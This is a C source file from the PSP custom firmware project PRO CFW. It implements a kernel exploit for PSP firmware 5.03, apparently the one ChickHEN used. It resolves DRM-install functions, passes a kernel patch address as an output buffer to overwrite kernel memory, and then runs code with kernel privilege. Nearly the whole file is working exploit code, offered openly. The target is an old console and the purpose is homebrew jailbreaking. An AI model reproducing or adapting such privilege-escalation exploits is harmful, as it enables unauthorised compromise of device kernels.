/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "globals.h"
#include "macros.h"
#include "functions.h"
#include "kxploit.h"

/*
sceDRMInstallGetFileInfo Kernel Exploit for PSP 5.03 used by ChickHEN
*/

#define PATCH_ADDR (SYSMEM_TEXT+0x0000F024)

/* Psheet imports */
int (* sceDRMInstallInit)(int a0, int a1);
int (* sceDRMInstallGetFileInfo)(const char *file, int a1, int a2, void *a3);
int (* _sceKernelLibcTime)(u32 a0, u32 a1);

UserFunctions* g_tbl = NULL;

int stubScanner(UserFunctions* tbl){
    g_tbl = tbl;

    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_SERVICE);
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_MATCHING2);
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_DRM);

    sceDRMInstallInit = g_tbl->FindImportUserRam("scePsheet", 0x302AB4B8);
    sceDRMInstallGetFileInfo = g_tbl->FindImportUserRam("scePsheet", 0x34E68A41);

    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    return (sceDRMInstallInit==NULL || sceDRMInstallGetFileInfo==NULL);

}

void repairInstruction(KernelFunctions* k_tbl){
    
}

int doExploit(void){

    sceDRMInstallInit(1, 0x20000);
    sceDRMInstallGetFileInfo("ms0:/PSP/SAVEDATA/ARK_01234/H.BIN", 0, 0, PATCH_ADDR);

    return 0;
}

void executeKernel(u32 kfuncaddr){
    _sceKernelLibcTime(0x08800000, KERNELIFY(kfuncaddr));
}

